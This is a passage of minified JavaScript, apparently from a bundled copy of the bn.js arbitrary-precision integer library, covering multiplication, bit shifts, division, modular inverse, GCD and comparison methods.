qn=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(qn>>>26)|0,qn&=67108863,B=Math.imul(ae,yt),M=Math.imul(ae,Ye),M=M+Math.imul(U,yt)|0,W=Math.imul(U,Ye),B=B+Math.imul(q,xt)|0,M=M+Math.imul(q,Mt)|0,M=M+Math.imul(J,xt)|0,W=W+Math.imul(J,Mt)|0;var yo=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(yo>>>26)|0,yo&=67108863,B=Math.imul(Z,yt),M=Math.imul(Z,Ye),M=M+Math.imul(j,yt)|0,W=Math.imul(j,Ye),B=B+Math.imul(ae,xt)|0,M=M+Math.imul(ae,Mt)|0,M=M+Math.imul(U,xt)|0,W=W+Math.imul(U,Mt)|0,B=B+Math.imul(q,Ur)|0,M=M+Math.imul(q,Vt)|0,M=M+Math.imul(J,Ur)|0,W=W+Math.imul(J,Vt)|0;var xo=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(xo>>>26)|0,xo&=67108863,B=Math.imul(se,yt),M=Math.imul(se,Ye),M=M+Math.imul(ne,yt)|0,W=Math.imul(ne,Ye),B=B+Math.imul(Z,xt)|0,M=M+Math.imul(Z,Mt)|0,M=M+Math.imul(j,xt)|0,W=W+Math.imul(j,Mt)|0,B=B+Math.imul(ae,Ur)|0,M=M+Math.imul(ae,Vt)|0,M=M+Math.imul(U,Ur)|0,W=W+Math.imul(U,Vt)|0,B=B+Math.imul(q,Br)|0,M=M+Math.imul(q,Ct)|0,M=M+Math.imul(J,Br)|0,W=W+Math.imul(J,Ct)|0;var Co=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Co>>>26)|0,Co&=67108863,B=Math.imul(Re,yt),M=Math.imul(Re,Ye),M=M+Math.imul($e,yt)|0,W=Math.imul($e,Ye),B=B+Math.imul(se,xt)|0,M=M+Math.imul(se,Mt)|0,M=M+Math.imul(ne,xt)|0,W=W+Math.imul(ne,Mt)|0,B=B+Math.imul(Z,Ur)|0,M=M+Math.imul(Z,Vt)|0,M=M+Math.imul(j,Ur)|0,W=W+Math.imul(j,Vt)|0,B=B+Math.imul(ae,Br)|0,M=M+Math.imul(ae,Ct)|0,M=M+Math.imul(U,Br)|0,W=W+Math.imul(U,Ct)|0,B=B+Math.imul(q,tr)|0,M=M+Math.imul(q,mt)|0,M=M+Math.imul(J,tr)|0,W=W+Math.imul(J,mt)|0;var Rn=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Rn>>>26)|0,Rn&=67108863,B=Math.imul(De,yt),M=Math.imul(De,Ye),M=M+Math.imul(Le,yt)|0,W=Math.imul(Le,Ye),B=B+Math.imul(Re,xt)|0,M=M+Math.imul(Re,Mt)|0,M=M+Math.imul($e,xt)|0,W=W+Math.imul($e,Mt)|0,B=B+Math.imul(se,Ur)|0,M=M+Math.imul(se,Vt)|0,M=M+Math.imul(ne,Ur)|0,W=W+Math.imul(ne,Vt)|0,B=B+Math.imul(Z,Br)|0,M=M+Math.imul(Z,Ct)|0,M=M+Math.imul(j,Br)|0,W=W+Math.imul(j,Ct)|0,B=B+Math.imul(ae,tr)|0,M=M+Math.imul(ae,mt)|0,M=M+Math.imul(U,tr)|0,W=W+Math.imul(U,mt)|0,B=B+Math.imul(q,ar)|0,M=M+Math.imul(q,It)|0,M=M+Math.imul(J,ar)|0,W=W+Math.imul(J,It)|0;var Al=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Al>>>26)|0,Al&=67108863,B=Math.imul(nt,yt),M=Math.imul(nt,Ye),M=M+Math.imul(ct,yt)|0,W=Math.imul(ct,Ye),B=B+Math.imul(De,xt)|0,M=M+Math.imul(De,Mt)|0,M=M+Math.imul(Le,xt)|0,W=W+Math.imul(Le,Mt)|0,B=B+Math.imul(Re,Ur)|0,M=M+Math.imul(Re,Vt)|0,M=M+Math.imul($e,Ur)|0,W=W+Math.imul($e,Vt)|0,B=B+Math.imul(se,Br)|0,M=M+Math.imul(se,Ct)|0,M=M+Math.imul(ne,Br)|0,W=W+Math.imul(ne,Ct)|0,B=B+Math.imul(Z,tr)|0,M=M+Math.imul(Z,mt)|0,M=M+Math.imul(j,tr)|0,W=W+Math.imul(j,mt)|0,B=B+Math.imul(ae,ar)|0,M=M+Math.imul(ae,It)|0,M=M+Math.imul(U,ar)|0,W=W+Math.imul(U,It)|0,B=B+Math.imul(q,lr)|0,M=M+Math.imul(q,At)|0,M=M+Math.imul(J,lr)|0,W=W+Math.imul(J,At)|0;var Il=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Il>>>26)|0,Il&=67108863,B=Math.imul(zt,yt),M=Math.imul(zt,Ye),M=M+Math.imul(Q,yt)|0,W=Math.imul(Q,Ye),B=B+Math.imul(nt,xt)|0,M=M+Math.imul(nt,Mt)|0,M=M+Math.imul(ct,xt)|0,W=W+Math.imul(ct,Mt)|0,B=B+Math.imul(De,Ur)|0,M=M+Math.imul(De,Vt)|0,M=M+Math.imul(Le,Ur)|0,W=W+Math.imul(Le,Vt)|0,B=B+Math.imul(Re,Br)|0,M=M+Math.imul(Re,Ct)|0,M=M+Math.imul($e,Br)|0,W=W+Math.imul($e,Ct)|0,B=B+Math.imul(se,tr)|0,M=M+Math.imul(se,mt)|0,M=M+Math.imul(ne,tr)|0,W=W+Math.imul(ne,mt)|0,B=B+Math.imul(Z,ar)|0,M=M+Math.imul(Z,It)|0,M=M+Math.imul(j,ar)|0,W=W+Math.imul(j,It)|0,B=B+Math.imul(ae,lr)|0,M=M+Math.imul(ae,At)|0,M=M+Math.imul(U,lr)|0,W=W+Math.imul(U,At)|0,B=B+Math.imul(q,Kt)|0,M=M+Math.imul(q,wt)|0,M=M+Math.imul(J,Kt)|0,W=W+Math.imul(J,wt)|0;var Tl=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Tl>>>26)|0,Tl&=67108863,B=Math.imul(H,yt),M=Math.imul(H,Ye),M=M+Math.imul(ie,yt)|0,W=Math.imul(ie,Ye),B=B+Math.imul(zt,xt)|0,M=M+Math.imul(zt,Mt)|0,M=M+Math.imul(Q,xt)|0,W=W+Math.imul(Q,Mt)|0,B=B+Math.imul(nt,Ur)|0,M=M+Math.imul(nt,Vt)|0,M=M+Math.imul(ct,Ur)|0,W=W+Math.imul(ct,Vt)|0,B=B+Math.imul(De,Br)|0,M=M+Math.imul(De,Ct)|0,M=M+Math.imul(Le,Br)|0,W=W+Math.imul(Le,Ct)|0,B=B+Math.imul(Re,tr)|0,M=M+Math.imul(Re,mt)|0,M=M+Math.imul($e,tr)|0,W=W+Math.imul($e,mt)|0,B=B+Math.imul(se,ar)|0,M=M+Math.imul(se,It)|0,M=M+Math.imul(ne,ar)|0,W=W+Math.imul(ne,It)|0,B=B+Math.imul(Z,lr)|0,M=M+Math.imul(Z,At)|0,M=M+Math.imul(j,lr)|0,W=W+Math.imul(j,At)|0,B=B+Math.imul(ae,Kt)|0,M=M+Math.imul(ae,wt)|0,M=M+Math.imul(U,Kt)|0,W=W+Math.imul(U,wt)|0,B=B+Math.imul(q,ur)|0,M=M+Math.imul(q,Tt)|0,M=M+Math.imul(J,ur)|0,W=W+Math.imul(J,Tt)|0;var kl=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(kl>>>26)|0,kl&=67108863,B=Math.imul(we,yt),M=Math.imul(we,Ye),M=M+Math.imul(_e,yt)|0,W=Math.imul(_e,Ye),B=B+Math.imul(H,xt)|0,M=M+Math.imul(H,Mt)|0,M=M+Math.imul(ie,xt)|0,W=W+Math.imul(ie,Mt)|0,B=B+Math.imul(zt,Ur)|0,M=M+Math.imul(zt,Vt)|0,M=M+Math.imul(Q,Ur)|0,W=W+Math.imul(Q,Vt)|0,B=B+Math.imul(nt,Br)|0,M=M+Math.imul(nt,Ct)|0,M=M+Math.imul(ct,Br)|0,W=W+Math.imul(ct,Ct)|0,B=B+Math.imul(De,tr)|0,M=M+Math.imul(De,mt)|0,M=M+Math.imul(Le,tr)|0,W=W+Math.imul(Le,mt)|0,B=B+Math.imul(Re,ar)|0,M=M+Math.imul(Re,It)|0,M=M+Math.imul($e,ar)|0,W=W+Math.imul($e,It)|0,B=B+Math.imul(se,lr)|0,M=M+Math.imul(se,At)|0,M=M+Math.imul(ne,lr)|0,W=W+Math.imul(ne,At)|0,B=B+Math.imul(Z,Kt)|0,M=M+Math.imul(Z,wt)|0,M=M+Math.imul(j,Kt)|0,W=W+Math.imul(j,wt)|0,B=B+Math.imul(ae,ur)|0,M=M+Math.imul(ae,Tt)|0,M=M+Math.imul(U,ur)|0,W=W+Math.imul(U,Tt)|0,B=B+Math.imul(q,Ar)|0,M=M+Math.imul(q,ri)|0,M=M+Math.imul(J,Ar)|0,W=W+Math.imul(J,ri)|0;var Nl=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Nl>>>26)|0,Nl&=67108863,B=Math.imul(we,xt),M=Math.imul(we,Mt),M=M+Math.imul(_e,xt)|0,W=Math.imul(_e,Mt),B=B+Math.imul(H,Ur)|0,M=M+Math.imul(H,Vt)|0,M=M+Math.imul(ie,Ur)|0,W=W+Math.imul(ie,Vt)|0,B=B+Math.imul(zt,Br)|0,M=M+Math.imul(zt,Ct)|0,M=M+Math.imul(Q,Br)|0,W=W+Math.imul(Q,Ct)|0,B=B+Math.imul(nt,tr)|0,M=M+Math.imul(nt,mt)|0,M=M+Math.imul(ct,tr)|0,W=W+Math.imul(ct,mt)|0,B=B+Math.imul(De,ar)|0,M=M+Math.imul(De,It)|0,M=M+Math.imul(Le,ar)|0,W=W+Math.imul(Le,It)|0,B=B+Math.imul(Re,lr)|0,M=M+Math.imul(Re,At)|0,M=M+Math.imul($e,lr)|0,W=W+Math.imul($e,At)|0,B=B+Math.imul(se,Kt)|0,M=M+Math.imul(se,wt)|0,M=M+Math.imul(ne,Kt)|0,W=W+Math.imul(ne,wt)|0,B=B+Math.imul(Z,ur)|0,M=M+Math.imul(Z,Tt)|0,M=M+Math.imul(j,ur)|0,W=W+Math.imul(j,Tt)|0,B=B+Math.imul(ae,Ar)|0,M=M+Math.imul(ae,ri)|0,M=M+Math.imul(U,Ar)|0,W=W+Math.imul(U,ri)|0;var yn=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(yn>>>26)|0,yn&=67108863,B=Math.imul(we,Ur),M=Math.imul(we,Vt),M=M+Math.imul(_e,Ur)|0,W=Math.imul(_e,Vt),B=B+Math.imul(H,Br)|0,M=M+Math.imul(H,Ct)|0,M=M+Math.imul(ie,Br)|0,W=W+Math.imul(ie,Ct)|0,B=B+Math.imul(zt,tr)|0,M=M+Math.imul(zt,mt)|0,M=M+Math.imul(Q,tr)|0,W=W+Math.imul(Q,mt)|0,B=B+Math.imul(nt,ar)|0,M=M+Math.imul(nt,It)|0,M=M+Math.imul(ct,ar)|0,W=W+Math.imul(ct,It)|0,B=B+Math.imul(De,lr)|0,M=M+Math.imul(De,At)|0,M=M+Math.imul(Le,lr)|0,W=W+Math.imul(Le,At)|0,B=B+Math.imul(Re,Kt)|0,M=M+Math.imul(Re,wt)|0,M=M+Math.imul($e,Kt)|0,W=W+Math.imul($e,wt)|0,B=B+Math.imul(se,ur)|0,M=M+Math.imul(se,Tt)|0,M=M+Math.imul(ne,ur)|0,W=W+Math.imul(ne,Tt)|0,B=B+Math.imul(Z,Ar)|0,M=M+Math.imul(Z,ri)|0,M=M+Math.imul(j,Ar)|0,W=W+Math.imul(j,ri)|0;var Pl=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Pl>>>26)|0,Pl&=67108863,B=Math.imul(we,Br),M=Math.imul(we,Ct),M=M+Math.imul(_e,Br)|0,W=Math.imul(_e,Ct),B=B+Math.imul(H,tr)|0,M=M+Math.imul(H,mt)|0,M=M+Math.imul(ie,tr)|0,W=W+Math.imul(ie,mt)|0,B=B+Math.imul(zt,ar)|0,M=M+Math.imul(zt,It)|0,M=M+Math.imul(Q,ar)|0,W=W+Math.imul(Q,It)|0,B=B+Math.imul(nt,lr)|0,M=M+Math.imul(nt,At)|0,M=M+Math.imul(ct,lr)|0,W=W+Math.imul(ct,At)|0,B=B+Math.imul(De,Kt)|0,M=M+Math.imul(De,wt)|0,M=M+Math.imul(Le,Kt)|0,W=W+Math.imul(Le,wt)|0,B=B+Math.imul(Re,ur)|0,M=M+Math.imul(Re,Tt)|0,M=M+Math.imul($e,ur)|0,W=W+Math.imul($e,Tt)|0,B=B+Math.imul(se,Ar)|0,M=M+Math.imul(se,ri)|0,M=M+Math.imul(ne,Ar)|0,W=W+Math.imul(ne,ri)|0;var $l=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+($l>>>26)|0,$l&=67108863,B=Math.imul(we,tr),M=Math.imul(we,mt),M=M+Math.imul(_e,tr)|0,W=Math.imul(_e,mt),B=B+Math.imul(H,ar)|0,M=M+Math.imul(H,It)|0,M=M+Math.imul(ie,ar)|0,W=W+Math.imul(ie,It)|0,B=B+Math.imul(zt,lr)|0,M=M+Math.imul(zt,At)|0,M=M+Math.imul(Q,lr)|0,W=W+Math.imul(Q,At)|0,B=B+Math.imul(nt,Kt)|0,M=M+Math.imul(nt,wt)|0,M=M+Math.imul(ct,Kt)|0,W=W+Math.imul(ct,wt)|0,B=B+Math.imul(De,ur)|0,M=M+Math.imul(De,Tt)|0,M=M+Math.imul(Le,ur)|0,W=W+Math.imul(Le,Tt)|0,B=B+Math.imul(Re,Ar)|0,M=M+Math.imul(Re,ri)|0,M=M+Math.imul($e,Ar)|0,W=W+Math.imul($e,ri)|0;var Ts=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Ts>>>26)|0,Ts&=67108863,B=Math.imul(we,ar),M=Math.imul(we,It),M=M+Math.imul(_e,ar)|0,W=Math.imul(_e,It),B=B+Math.imul(H,lr)|0,M=M+Math.imul(H,At)|0,M=M+Math.imul(ie,lr)|0,W=W+Math.imul(ie,At)|0,B=B+Math.imul(zt,Kt)|0,M=M+Math.imul(zt,wt)|0,M=M+Math.imul(Q,Kt)|0,W=W+Math.imul(Q,wt)|0,B=B+Math.imul(nt,ur)|0,M=M+Math.imul(nt,Tt)|0,M=M+Math.imul(ct,ur)|0,W=W+Math.imul(ct,Tt)|0,B=B+Math.imul(De,Ar)|0,M=M+Math.imul(De,ri)|0,M=M+Math.imul(Le,Ar)|0,W=W+Math.imul(Le,ri)|0;var Rl=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(Rl>>>26)|0,Rl&=67108863,B=Math.imul(we,lr),M=Math.imul(we,At),M=M+Math.imul(_e,lr)|0,W=Math.imul(_e,At),B=B+Math.imul(H,Kt)|0,M=M+Math.imul(H,wt)|0,M=M+Math.imul(ie,Kt)|0,W=W+Math.imul(ie,wt)|0,B=B+Math.imul(zt,ur)|0,M=M+Math.imul(zt,Tt)|0,M=M+Math.imul(Q,ur)|0,W=W+Math.imul(Q,Tt)|0,B=B+Math.imul(nt,Ar)|0,M=M+Math.imul(nt,ri)|0,M=M+Math.imul(ct,Ar)|0,W=W+Math.imul(ct,ri)|0;var X=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(X>>>26)|0,X&=67108863,B=Math.imul(we,Kt),M=Math.imul(we,wt),M=M+Math.imul(_e,Kt)|0,W=Math.imul(_e,wt),B=B+Math.imul(H,ur)|0,M=M+Math.imul(H,Tt)|0,M=M+Math.imul(ie,ur)|0,W=W+Math.imul(ie,Tt)|0,B=B+Math.imul(zt,Ar)|0,M=M+Math.imul(zt,ri)|0,M=M+Math.imul(Q,Ar)|0,W=W+Math.imul(Q,ri)|0;var ee=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(ee>>>26)|0,ee&=67108863,B=Math.imul(we,ur),M=Math.imul(we,Tt),M=M+Math.imul(_e,ur)|0,W=Math.imul(_e,Tt),B=B+Math.imul(H,Ar)|0,M=M+Math.imul(H,ri)|0,M=M+Math.imul(ie,Ar)|0,W=W+Math.imul(ie,ri)|0;var ce=(P+B|0)+((M&8191)<<13)|0;P=(W+(M>>>13)|0)+(ce>>>26)|0,ce&=67108863,B=Math.imul(we,Ar),M=Math.imul(we,ri),M=M+Math.imul(_e,Ar)|0,W=Math.imul(_e,ri);var ve=(P+B|0)+((M&8191)<<13)|0;return P=(W+(M>>>13)|0)+(ve>>>26)|0,ve&=67108863,R[0]=qn,R[1]=yo,R[2]=xo,R[3]=Co,R[4]=Rn,R[5]=Al,R[6]=Il,R[7]=Tl,R[8]=kl,R[9]=Nl,R[10]=yn,R[11]=Pl,R[12]=$l,R[13]=Ts,R[14]=Rl,R[15]=X,R[16]=ee,R[17]=ce,R[18]=ve,P!==0&&(R[19]=P,_.length++),_};Math.imul||(x=m);function S(A,b,v){v.negative=b.negative^A.negative,v.length=A.length+b.length;for(var _=0,O=0,D=0;D<v.length-1;D++){var R=O;O=0;for(var P=_&67108863,B=Math.min(D,b.length-1),M=Math.max(0,D-A.length+1);M<=B;M++){var W=D-M,K=A.words[W]|0,q=b.words[M]|0,J=K*q,le=J&67108863;R=R+(J/67108864|0)|0,le=le+P|0,P=le&67108863,R=R+(le>>>26)|0,O+=R>>>26,R&=67108863}v.words[D]=P,_=R,R=O}return _!==0?v.words[D]=_:v.length--,v._strip()}function T(A,b,v){return S(A,b,v)}s.prototype.mulTo=function(b,v){var _,O=this.length+b.length;return this.length===10&&b.length===10?_=x(this,b,v):O<63?_=m(this,b,v):O<1024?_=S(this,b,v):_=T(this,b,v),_},s.prototype.mul=function(b){var v=new s(null);return v.words=new Array(this.length+b.length),this.mulTo(b,v)},s.prototype.mulf=function(b){var v=new s(null);return v.words=new Array(this.length+b.length),T(this,b,v)},s.prototype.imul=function(b){return this.clone().mulTo(b,this)},s.prototype.imuln=function(b){var v=b<0;v&&(b=-b),i(typeof b=="number"),i(b<67108864);for(var _=0,O=0;O<this.length;O++){var D=(this.words[O]|0)*b,R=(D&67108863)+(_&67108863);_>>=26,_+=D/67108864|0,_+=R>>>26,this.words[O]=R&67108863}return _!==0&&(this.words[O]=_,this.length++),this.length=b===0?1:this.length,v?this.ineg():this},s.prototype.muln=function(b){return this.clone().imuln(b)},s.prototype.sqr=function(){return this.mul(this)},s.prototype.isqr=function(){return this.imul(this.clone())},s.prototype.pow=function(b){var v=w(b);if(v.length===0)return new s(1);for(var _=this,O=0;O<v.length&&v[O]===0;O++,_=_.sqr());if(++O<v.length)for(var D=_.sqr();O<v.length;O++,D=D.sqr())v[O]!==0&&(_=_.mul(D));return _},s.prototype.iushln=function(b){i(typeof b=="number"&&b>=0);var v=b%26,_=(b-v)/26,O=67108863>>>26-v<<26-v,D;if(v!==0){var R=0;for(D=0;D<this.length;D++){var P=this.words[D]&O,B=(this.words[D]|0)-P<<v;this.words[D]=B|R,R=P>>>26-v}R&&(this.words[D]=R,this.length++)}if(_!==0){for(D=this.length-1;D>=0;D--)this.words[D+_]=this.words[D];for(D=0;D<_;D++)this.words[D]=0;this.length+=_}return this._strip()},s.prototype.ishln=function(b){return i(this.negative===0),this.iushln(b)},s.prototype.iushrn=function(b,v,_){i(typeof b=="number"&&b>=0);var O;v?O=(v-v%26)/26:O=0;var D=b%26,R=Math.min((b-D)/26,this.length),P=67108863^67108863>>>D<<D,B=_;if(O-=R,O=Math.max(0,O),B){for(var M=0;M<R;M++)B.words[M]=this.words[M];B.length=R}if(R!==0)if(this.length>R)for(this.length-=R,M=0;M<this.length;M++)this.words[M]=this.words[M+R];else this.words[0]=0,this.length=1;var W=0;for(M=this.length-1;M>=0&&(W!==0||M>=O);M--){var K=this.words[M]|0;this.words[M]=W<<26-D|K>>>D,W=K&P}return B&&W!==0&&(B.words[B.length++]=W),this.length===0&&(this.words[0]=0,this.length=1),this._strip()},s.prototype.ishrn=function(b,v,_){return i(this.negative===0),this.iushrn(b,v,_)},s.prototype.shln=function(b){return this.clone().ishln(b)},s.prototype.ushln=function(b){return this.clone().iushln(b)},s.prototype.shrn=function(b){return this.clone().ishrn(b)},s.prototype.ushrn=function(b){return this.clone().iushrn(b)},s.prototype.testn=function(b){i(typeof b=="number"&&b>=0);var v=b%26,_=(b-v)/26,O=1<<v;if(this.length<=_)return!1;var D=this.words[_];return!!(D&O)},s.prototype.imaskn=function(b){i(typeof b=="number"&&b>=0);var v=b%26,_=(b-v)/26;if(i(this.negative===0,"imaskn works only with positive numbers"),this.length<=_)return this;if(v!==0&&_++,this.length=Math.min(_,this.length),v!==0){var O=67108863^67108863>>>v<<v;this.words[this.length-1]&=O}return this._strip()},s.prototype.maskn=function(b){return this.clone().imaskn(b)},s.prototype.iaddn=function(b){return i(typeof b=="number"),i(b<67108864),b<0?this.isubn(-b):this.negative!==0?this.length===1&&(this.words[0]|0)<=b?(this.words[0]=b-(this.words[0]|0),this.negative=0,this):(this.negative=0,this.isubn(b),this.negative=1,this):this._iaddn(b)},s.prototype._iaddn=function(b){this.words[0]+=b;for(var v=0;v<this.length&&this.words[v]>=67108864;v++)this.words[v]-=67108864,v===this.length-1?this.words[v+1]=1:this.words[v+1]++;return this.length=Math.max(this.length,v+1),this},s.prototype.isubn=function(b){if(i(typeof b=="number"),i(b<67108864),b<0)return this.iaddn(-b);if(this.negative!==0)return this.negative=0,this.iaddn(b),this.negative=1,this;if(this.words[0]-=b,this.length===1&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var v=0;v<this.length&&this.words[v]<0;v++)this.words[v]+=67108864,this.words[v+1]-=1;return this._strip()},s.prototype.addn=function(b){return this.clone().iaddn(b)},s.prototype.subn=function(b){return this.clone().isubn(b)},s.prototype.iabs=function(){return this.negative=0,this},s.prototype.abs=function(){return this.clone().iabs()},s.prototype._ishlnsubmul=function(b,v,_){var O=b.length+_,D;this._expand(O);var R,P=0;for(D=0;D<b.length;D++){R=(this.words[D+_]|0)+P;var B=(b.words[D]|0)*v;R-=B&67108863,P=(R>>26)-(B/67108864|0),this.words[D+_]=R&67108863}for(;D<this.length-_;D++)R=(this.words[D+_]|0)+P,P=R>>26,this.words[D+_]=R&67108863;if(P===0)return this._strip();for(i(P===-1),P=0,D=0;D<this.length;D++)R=-(this.words[D]|0)+P,P=R>>26,this.words[D]=R&67108863;return this.negative=1,this._strip()},s.prototype._wordDiv=function(b,v){var _=this.length-b.length,O=this.clone(),D=b,R=D.words[D.length-1]|0,P=this._countBits(R);_=26-P,_!==0&&(D=D.ushln(_),O.iushln(_),R=D.words[D.length-1]|0);var B=O.length-D.length,M;if(v!=="mod"){M=new s(null),M.length=B+1,M.words=new Array(M.length);for(var W=0;W<M.length;W++)M.words[W]=0}var K=O.clone()._ishlnsubmul(D,1,B);K.negative===0&&(O=K,M&&(M.words[B]=1));for(var q=B-1;q>=0;q--){var J=(O.words[D.length+q]|0)*67108864+(O.words[D.length+q-1]|0);for(J=Math.min(J/R|0,67108863),O._ishlnsubmul(D,J,q);O.negative!==0;)J--,O.negative=0,O._ishlnsubmul(D,1,q),O.isZero()||(O.negative^=1);M&&(M.words[q]=J)}return M&&M._strip(),O._strip(),v!=="div"&&_!==0&&O.iushrn(_),{div:M||null,mod:O}},s.prototype.divmod=function(b,v,_){if(i(!b.isZero()),this.isZero())return{div:new s(0),mod:new s(0)};var O,D,R;return this.negative!==0&&b.negative===0?(R=this.neg().divmod(b,v),v!=="mod"&&(O=R.div.neg()),v!=="div"&&(D=R.mod.neg(),_&&D.negative!==0&&D.iadd(b)),{div:O,mod:D}):this.negative===0&&b.negative!==0?(R=this.divmod(b.neg(),v),v!=="mod"&&(O=R.div.neg()),{div:O,mod:R.mod}):(this.negative&b.negative)!==0?(R=this.neg().divmod(b.neg(),v),v!=="div"&&(D=R.mod.neg(),_&&D.negative!==0&&D.isub(b)),{div:R.div,mod:D}):b.length>this.length||this.cmp(b)<0?{div:new s(0),mod:this}:b.length===1?v==="div"?{div:this.divn(b.words[0]),mod:null}:v==="mod"?{div:null,mod:new s(this.modrn(b.words[0]))}:{div:this.divn(b.words[0]),mod:new s(this.modrn(b.words[0]))}:this._wordDiv(b,v)},s.prototype.div=function(b){return this.divmod(b,"div",!1).div},s.prototype.mod=function(b){return this.divmod(b,"mod",!1).mod},s.prototype.umod=function(b){return this.divmod(b,"mod",!0).mod},s.prototype.divRound=function(b){var v=this.divmod(b);if(v.mod.isZero())return v.div;var _=v.div.negative!==0?v.mod.isub(b):v.mod,O=b.ushrn(1),D=b.andln(1),R=_.cmp(O);return R<0||D===1&&R===0?v.div:v.div.negative!==0?v.div.isubn(1):v.div.iaddn(1)},s.prototype.modrn=function(b){var v=b<0;v&&(b=-b),i(b<=67108863);for(var _=(1<<26)%b,O=0,D=this.length-1;D>=0;D--)O=(_*O+(this.words[D]|0))%b;return v?-O:O},s.prototype.modn=function(b){return this.modrn(b)},s.prototype.idivn=function(b){var v=b<0;v&&(b=-b),i(b<=67108863);for(var _=0,O=this.length-1;O>=0;O--){var D=(this.words[O]|0)+_*67108864;this.words[O]=D/b|0,_=D%b}return this._strip(),v?this.ineg():this},s.prototype.divn=function(b){return this.clone().idivn(b)},s.prototype.egcd=function(b){i(b.negative===0),i(!b.isZero());var v=this,_=b.clone();v.negative!==0?v=v.umod(b):v=v.clone();for(var O=new s(1),D=new s(0),R=new s(0),P=new s(1),B=0;v.isEven()&&_.isEven();)v.iushrn(1),_.iushrn(1),++B;for(var M=_.clone(),W=v.clone();!v.isZero();){for(var K=0,q=1;(v.words[0]&q)===0&&K<26;++K,q<<=1);if(K>0)for(v.iushrn(K);K-- >0;)(O.isOdd()||D.isOdd())&&(O.iadd(M),D.isub(W)),O.iushrn(1),D.iushrn(1);for(var J=0,le=1;(_.words[0]&le)===0&&J<26;++J,le<<=1);if(J>0)for(_.iushrn(J);J-- >0;)(R.isOdd()||P.isOdd())&&(R.iadd(M),P.isub(W)),R.iushrn(1),P.iushrn(1);v.cmp(_)>=0?(v.isub(_),O.isub(R),D.isub(P)):(_.isub(v),R.isub(O),P.isub(D))}return{a:R,b:P,gcd:_.iushln(B)}},s.prototype._invmp=function(b){i(b.negative===0),i(!b.isZero());var v=this,_=b.clone();v.negative!==0?v=v.umod(b):v=v.clone();for(var O=new s(1),D=new s(0),R=_.clone();v.cmpn(1)>0&&_.cmpn(1)>0;){for(var P=0,B=1;(v.words[0]&B)===0&&P<26;++P,B<<=1);if(P>0)for(v.iushrn(P);P-- >0;)O.isOdd()&&O.iadd(R),O.iushrn(1);for(var M=0,W=1;(_.words[0]&W)===0&&M<26;++M,W<<=1);if(M>0)for(_.iushrn(M);M-- >0;)D.isOdd()&&D.iadd(R),D.iushrn(1);v.cmp(_)>=0?(v.isub(_),O.isub(D)):(_.isub(v),D.isub(O))}var K;return v.cmpn(1)===0?K=O:K=D,K.cmpn(0)<0&&K.iadd(b),K},s.prototype.gcd=function(b){if(this.isZero())return b.abs();if(b.isZero())return this.abs();var v=this.clone(),_=b.clone();v.negative=0,_.negative=0;for(var O=0;v.isEven()&&_.isEven();O++)v.iushrn(1),_.iushrn(1);do{for(;v.isEven();)v.iushrn(1);for(;_.isEven();)_.iushrn(1);var D=v.cmp(_);if(D<0){var R=v;v=_,_=R}else if(D===0||_.cmpn(1)===0)break;v.isub(_)}while(!0);return _.iushln(O)},s.prototype.invm=function(b){return this.egcd(b).a.umod(b)},s.prototype.isEven=function(){return(this.words[0]&1)===0},s.prototype.isOdd=function(){return(this.words[0]&1)===1},s.prototype.andln=function(b){return this.words[0]&b},s.prototype.bincn=function(b){i(typeof b=="number");var v=b%26,_=(b-v)/26,O=1<<v;if(this.length<=_)return this._expand(_+1),this.words[_]|=O,this;for(var D=O,R=_;D!==0&&R<this.length;R++){var P=this.words[R]|0;P+=D,D=P>>>26,P&=67108863,this.words[R]=P}return D!==0&&(this.words[R]=D,this.length++),this},s.prototype.isZero=function(){return this.length===1&&this.words[0]===0},s.prototype.cmpn=function(b){var v=b<0;if(this.negative!==0&&!v)return-1;if(this.negative===0&&v)return 1;this._strip();var _;if(this.length>1)_=1;else{v&&(b=-b),i(b<=67108863,"Number is too big");var O=this.words[0]|0;_=O===b?0:O<b?-1:1}return this.negative!==0?-_|0:_},s.prototype.cmp=function(b){if(this.negative!==0&&b.negative===0)return-1;if(this.negative===0&&b.negative!==0)return 1;var v=this.ucmp(b);return this.negative!==0?-v|0:v},s.prototype.ucmp=function(b){if(this.length>b.length)return 1;if(this.length<b.length)return-1;for(var v=0,_=this.length-1;_>=0;_--){var O=this.words[_]|0,D=b.words[_]|0;if(O!==D){O<D?v=-1:O>D&&(v=1);break}}return v},s.prototype.gtn=function(b){return this.cmpn(b)===1},s.prototype.gt=function(b){return this.cmp(b)===1},s.prototype.gten=function(b){return this.cmpn(b)>=0},s.prototype.gte=function(b){return this.cmp(b)>=0},s.prototype.ltn=function(b){return this.cmpn(b)===-1},s.prototype.lt=function(b){return this.cmp(b)===-1},s.prototype.lten=function(b){return this.cmpn(b)<=0},s.prototype.lte=function(b){return this.cmp(b)<=0},s.prototype.eqn=function(b){return this.cmpn(b)===0},s.prototype.eq=function(b){return this.cmp(b)===0},s.red=function(b){return new $(b)},s.prototype.toRed=function(b){return i(!this.red,"Already a number in reduction context"),i(this.negative===0,"red works only with positives"),b.convertTo(this)._forceRed(b)},s.prototype.fromRed=function(){return i(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},s.prototype._forceRed=function(b){return this.red=b,this},s.prototype.forceRed=function(b){return i(!this.red,"Already a number in reduction context"),this._forceRed(b)},s.prototype.redAdd=function(b){return i(this.red,"redAdd works only with red 